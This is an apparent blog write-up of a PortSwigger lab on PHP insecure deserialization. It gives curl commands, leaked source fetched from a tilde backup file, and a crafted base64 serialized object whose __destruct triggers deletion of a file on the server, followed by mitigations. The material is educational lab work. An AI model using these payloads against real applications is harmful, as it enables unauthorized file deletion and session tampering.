<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="How to exploit PHP insecure deserialization to inject arbitrary objects and trigger magic methods for remote file deletion."><link rel="canonical" href="https://curlswiggerlabs.github.io/php-deserialization-arbitrary-object-injection/"><link rel="alternate" hreflang="en" href="https://curlswiggerlabs.github.io/en/"><link rel="alternate" hreflang="x-default" href="https://curlswiggerlabs.github.io/en/"><meta property="og:type" content="website"><meta property="og:url" content="https://curlswiggerlabs.github.io/php-deserialization-arbitrary-object-injection/"><meta property="og:title" content="Arbitrary Object Injection in PHP (Insecure Deserialization)"><meta property="og:description" content="How to exploit PHP insecure deserialization to inject arbitrary objects and trigger magic methods for remote file deletion."><meta property="og:locale" content="en_US"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Arbitrary Object Injection in PHP (Insecure Deserialization)"><meta name="twitter:description" content="How to exploit PHP insecure deserialization to inject arbitrary objects and trigger magic methods for remote file deletion."><meta name="robots" content="index, follow"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300..700&display=swap" rel="stylesheet"><title>Arbitrary Object Injection in PHP (Insecure Deserialization)</title><style>body{background-color:#0f1117;color:#e2e8f0;margin:20px auto;max-width:900px;line-height:1.6;font-size:18px;padding:0 10px;font-family:Quicksand,sans-serif}h1,h2,h3{line-height:1.2;color:#f8fafc}p{margin:8px 0;color:#94a3b8}li{color:#94a3b8}a{color:#dc2626;text-decoration:none;transition:color .15s ease}a:visited{color:#dc2626}a:hover{color:#ef4444;text-decoration:underline}hr{border:none;border-top:1px solid #1e293b;margin:32px 0}blockquote{border-left:3px solid #dc2626;margin:0;padding:4px 16px;color:#64748b;font-style:italic}img{max-width:100%;border-radius:6px;border:1px solid #1e293b;display:block;margin:0 auto}pre{outline:1px solid #1e293b;background-color:#161b27!important;color:#e1e4e8;padding:8px 16px;display:inline-block;margin:8px 0;font-size:14px;width:100%;position:relative;border-radius:6px;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:break-word}pre:before{content:attr(data-language);position:absolute;top:4px;right:8px;font-size:12px;color:#64748b;font-weight:500}code:not(pre code){background-color:#1e293b;color:#dc2626;padding:2px 6px;border-radius:4px;font-size:.85em}pre code{background:none;padding:0;color:inherit;font-size:inherit}
</style></head> <body>  <main> <p><a href="/">← Home</a></p> <article> <h1>Arbitrary Object Injection in PHP (Insecure Deserialization)</h1> <p> <strong>Object Injection (PHP)</strong> ·
<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php" target="_blank" rel="noopener noreferrer">Lab page ↗</a> </p> <h2 id="lab-description-contains-spoilers">Lab Description (contains spoilers)</h2>
<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the <code>morale.txt</code> file from Carlos’s home directory. You will need to obtain source code access to solve this lab.</p>
<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
<h2 id="necessary-background-concepts-to-solve-the-lab">Necessary Background Concepts To Solve The Lab</h2>
<h3 id="what-is-serialization">What is Serialization?</h3>
<p>Serialization is the process of converting an object (a data structure in memory) into a format that can be stored or transmitted, like a string. Deserialization is the reverse: turning that string back into an object. In PHP, this is done with <code>serialize()</code> and <code>unserialize()</code>.</p>
<p>For example, a PHP object like:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E1E4E8">$user </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> User</span><span style="color:#E1E4E8">();</span></span>
<span class="line"><span style="color:#E1E4E8">$user</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;wiener&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">$user</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">access_token </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;abc123&quot;</span><span style="color:#E1E4E8">;</span></span></code></pre>
<p>Gets serialized into:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:6:&quot;abc123&quot;;}</span></span></code></pre>
<p>Breaking down the format:</p>
<ul>
<li><code>O:4:&quot;User&quot;</code> — <strong>O</strong>bject of class name length <strong>4</strong>, named <strong>“User”</strong></li>
<li><code>:2:</code> — has <strong>2</strong> properties</li>
<li><code>s:8:&quot;username&quot;</code> — <strong>s</strong>tring property name of length <strong>8</strong>: <strong>“username”</strong></li>
<li><code>s:6:&quot;wiener&quot;</code> — <strong>s</strong>tring value of length <strong>6</strong>: <strong>“wiener”</strong></li>
</ul>
<p>When an application stores serialized objects in cookies (like session tokens), an attacker can tamper with them. If the server blindly deserializes user-controlled input, it will reconstruct whatever object the attacker provides.</p>
<h3 id="what-are-php-magic-methods">What are PHP Magic Methods?</h3>
<p>PHP has special methods called <strong>magic methods</strong> that are automatically invoked at certain points in an object’s lifecycle. They always start with a double underscore (<code>__</code>). The most relevant ones for deserialization attacks are:</p>
<ul>
<li><code>__construct()</code> — called when an object is <strong>created</strong> (<code>new ClassName()</code>)</li>
<li><code>__destruct()</code> — called when an object is <strong>destroyed</strong> (goes out of scope, script ends, or garbage collected)</li>
<li><code>__wakeup()</code> — called when an object is <strong>deserialized</strong> (<code>unserialize()</code>)</li>
<li><code>__toString()</code> — called when an object is treated as a <strong>string</strong></li>
</ul>
<p>The dangerous one here is <code>__destruct()</code>. When PHP deserializes an object from a cookie, it creates that object in memory. When the request finishes processing, PHP’s garbage collector destroys the object, which <strong>automatically triggers <code>__destruct()</code></strong>. The attacker doesn’t need to call it — PHP does it for them.</p>
<h3 id="what-is-a-backup-file">What is a Backup File (~)?</h3>
<p>Many text editors (like Vim, Emacs, and others) automatically create backup copies of files by appending a tilde (<code>~</code>) to the filename. For example, editing <code>CustomTemplate.php</code> creates <code>CustomTemplate.php~</code>. These backup files often get accidentally deployed to production servers and can leak source code to anyone who requests them, since the web server serves them as plain text instead of executing them as PHP.</p>
<h2 id="writeup">Writeup</h2>
<p>First let’s explore the lab and log in to get a valid session cookie:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/login&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
<blockquote>
<p><strong>Command breakdown</strong>: <br/>
<code>-s</code> = silent mode (no progress meter) <br/>
<code>| cat</code> = pipe response output to my <a href="https://github.com/echoesofwhoami/echoes-bat-theme">customized cat command</a> for stylish display</p>
</blockquote>
<p>The login page has a simple form with no CSRF token:</p>
<p><img src="/images/deserialization-arbitrary-object-injection-in-php/01_login_form.png" alt="Login Form Screenshot"/></p>
<p>There’s also an interesting HTML comment at the bottom of the page:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="html"><code><span class="line"><span style="color:#6A737D">&lt;!-- TODO: Refactor once /libs/CustomTemplate.php is updated --&gt;</span></span></code></pre>
<p>This hints at a PHP file that might be interesting. Let’s log in first:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> -</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/login&quot;</span><span style="color:#79B8FF"> \</span></span>
<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> &quot;username=wiener&amp;password=peter&quot;</span><span style="color:#F97583"> 2&gt;</span><span style="color:#9ECBFF">/dev/null</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> head</span><span style="color:#79B8FF"> -10</span></span></code></pre>
<blockquote>
<p><strong>Command breakdown</strong>: <br/>
<code>-D -</code> = dump response headers to stdout <br/>
<code>-d &quot;username=wiener&amp;password=peter&quot;</code> = send POST data (automatically sets method to POST and Content-Type to application/x-www-form-urlencoded)</p>
</blockquote>
<p>Response:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>HTTP/2 302</span></span>
<span class="line"><span>location: /my-account?id=wiener</span></span>
<span class="line"><span>set-cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ%3d%3d; Secure; HttpOnly; SameSite=None</span></span></code></pre>
<p>The session cookie looks like base64. Let’s decode it:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ==&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> base64</span><span style="color:#79B8FF"> -d</span></span></code></pre>
<p>Output:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;xqiloaty6gq0bs6c6yu4pp4fcbf6uq3v&quot;;}</span></span></code></pre>
<p>This is a <strong>serialized PHP object</strong>. The server is storing the entire User object in the session cookie. This means we control what gets deserialized on the server — a critical vulnerability.</p>
<p>Now let’s investigate that <code>CustomTemplate.php</code> file we found in the HTML comment. Requesting the PHP file directly would just execute it, but we can try to get the backup file by appending a tilde (<code>~</code>):</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/libs/CustomTemplate.php~&quot;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> cat</span></span></code></pre>
<p>Response:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">&lt;?</span><span style="color:#79B8FF">php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> CustomTemplate</span><span style="color:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $template_file_path;</span></span>
<span class="line"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $lock_file_path;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($template_file_path) {</span></span>
<span class="line"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">template_file_path </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $template_file_path;</span></span>
<span class="line"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $template_file_path </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> &quot;.lock&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    private</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> isTemplateLocked</span><span style="color:#E1E4E8">() {</span></span>
<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> file_exists</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path);</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> getTemplate</span><span style="color:#E1E4E8">() {</span></span>
<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> file_get_contents</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">template_file_path);</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> saveTemplate</span><span style="color:#E1E4E8">($template) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">isTemplateLocked</span><span style="color:#E1E4E8">()) {</span></span>
<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">file_put_contents</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path, </span><span style="color:#9ECBFF">&quot;&quot;</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">                throw</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Exception</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;Could not write to &quot;</span><span style="color:#F97583"> .</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path);</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">file_put_contents</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">template_file_path, $template) </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">                throw</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Exception</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;Could not write to &quot;</span><span style="color:#F97583"> .</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">template_file_path);</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">    function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">() {</span></span>
<span class="line"><span style="color:#6A737D">        // Carlos thought this would be a good idea</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">file_exists</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path)) {</span></span>
<span class="line"><span style="color:#79B8FF">            unlink</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path);</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>Carlos is about to regret his idea of using the <code>__destruct()</code> magic method. <br/>
Let’s analyze the role of this piece of code in our attack:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">() {</span></span>
<span class="line"><span style="color:#6A737D">    // Carlos thought this would be a good idea</span></span>
<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">file_exists</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path)) {</span></span>
<span class="line"><span style="color:#79B8FF">        unlink</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-&gt;</span><span style="color:#E1E4E8">lock_file_path);</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>When a <code>CustomTemplate</code> object is destroyed, it calls <code>unlink()</code> on whatever path is stored in <code>$this-&gt;lock_file_path</code>. The <code>unlink()</code> function in PHP <strong>deletes a file</strong>. If we can control <code>lock_file_path</code>, we can delete any file on the server.</p>
<p><strong>The attack plan:</strong></p>
<ol>
<li>Craft a serialized <code>CustomTemplate</code> object with <code>lock_file_path</code> set to <code>/home/carlos/morale.txt</code></li>
<li>Base64-encode it (to match the session cookie format)</li>
<li>Send it as the session cookie</li>
<li>When PHP deserializes the cookie, it creates our <code>CustomTemplate</code> object</li>
<li>When the request finishes, PHP garbage-collects the object, triggering <code>__destruct()</code></li>
<li><code>__destruct()</code> calls <code>unlink(&quot;/home/carlos/morale.txt&quot;)</code> — deleting the file</li>
</ol>
<p>Let’s craft the serialized payload:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}</span></span></code></pre>
<p>Breaking this down:</p>
<ul>
<li><code>O:14:&quot;CustomTemplate&quot;</code> — Object of class <strong>CustomTemplate</strong> (14 chars)</li>
<li><code>:1:</code> — with <strong>1</strong> property</li>
<li><code>s:14:&quot;lock_file_path&quot;</code> — string property name <strong>lock_file_path</strong> (14 chars)</li>
<li><code>s:23:&quot;/home/carlos/morale.txt&quot;</code> — string value <strong>/home/carlos/morale.txt</strong> (23 chars)</li>
</ul>
<p>Now base64-encode it:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> -n</span><span style="color:#9ECBFF"> &#39;O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}&#39;</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> base64</span><span style="color:#79B8FF"> -w0</span></span></code></pre>
<blockquote>
<p><strong>Command breakdown</strong>: <br/>
<code>echo -n</code> = print without trailing newline (important for clean base64 encoding) <br/>
<code>base64 -w0</code> = base64 encode with no line wrapping</p>
</blockquote>
<p>Output:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==</span></span></code></pre>
<p>Now send the request with our malicious session cookie:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> &quot;https://&lt;lab-url&gt;.web-security-academy.net/my-account?id=wiener&quot;</span><span style="color:#79B8FF"> \</span></span>
<span class="line"><span style="color:#79B8FF">  -b</span><span style="color:#9ECBFF"> &quot;session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d&quot;</span></span></code></pre>
<blockquote>
<p><strong>Command breakdown</strong>: <br/>
<code>-b &quot;session=...&quot;</code> = send a cookie with the request. This replaces the legitimate session cookie with our malicious serialized object <br/>
<code>%3d%3d</code> = URL-encoded <code>==</code> (the base64 padding characters need to be URL-encoded in cookies)</p>
</blockquote>
<p>The server returns a <code>500 Internal Server Error</code> — which is expected. The server tried to use our <code>CustomTemplate</code> object as a <code>User</code> object and failed. But that doesn’t matter: by the time the error is thrown, PHP has already deserialized our object and when the script ends, <code>__destruct()</code> fires and deletes the file.</p>
<p><strong>Carlos’s file has been incinerated via insecure php object deserialization attack, accomplishing the lab’s objective.</strong></p>
<h2 id="mitigation">Mitigation</h2>
<ol>
<li><strong>Never deserialize untrusted data</strong>: Avoid using <code>unserialize()</code> on user-controlled input entirely. Use safer formats like JSON (<code>json_encode</code>/<code>json_decode</code>) for session data</li>
<li><strong>Use signed/encrypted sessions</strong>: If you must serialize session data, sign it with HMAC or encrypt it so tampering is detected</li>
<li><strong>Server-side session storage</strong>: Store session data on the server (files, database, Redis) and only give the client an opaque session ID</li>
<li><strong>Remove backup files</strong>: Ensure editor backup files (<code>~</code>, <code>.bak</code>, <code>.swp</code>) are never deployed to production. Adding the proper regex for each e.g.: <code>.*~</code> to <code>.gitignore</code> is a quick and easy way to prevent them from being committed, but more important is to configure the web server to block access to them</li>
<li><strong>Audit magic methods</strong>: Review <code>__destruct()</code>, <code>__wakeup()</code>, and other magic methods for dangerous operations like file deletion, command execution, or database queries</li>
</ol> </article> </main>  </body></html>